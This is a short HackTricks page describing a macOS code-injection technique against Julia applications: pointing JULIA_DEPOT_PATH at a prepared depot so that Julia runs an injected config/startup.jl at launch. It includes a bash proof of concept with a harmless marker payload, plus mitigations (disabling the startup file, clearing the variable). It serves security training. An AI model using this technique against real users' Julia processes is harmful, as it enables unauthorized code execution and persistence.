# macOS Julia Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `JULIA_DEPOT_PATH` and `startup.jl`

Julia normally executes `config/startup.jl` from its first depot at startup. `JULIA_DEPOT_PATH` controls the depot list, so pointing it to an attacker-readable tree redirects the automatically loaded startup file.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```

The trailing separator is useful when the victim still needs its normal packages. `julia --startup-file=no` disables this startup file. Clear the variable before launch because it also controls package registries, environments, caches, and code-loading locations.

## References

- [1] [Julia command-line interface: Startup file](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [2] [Julia environment variables: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)

{{#include ../../../banners/hacktricks-training.md}}
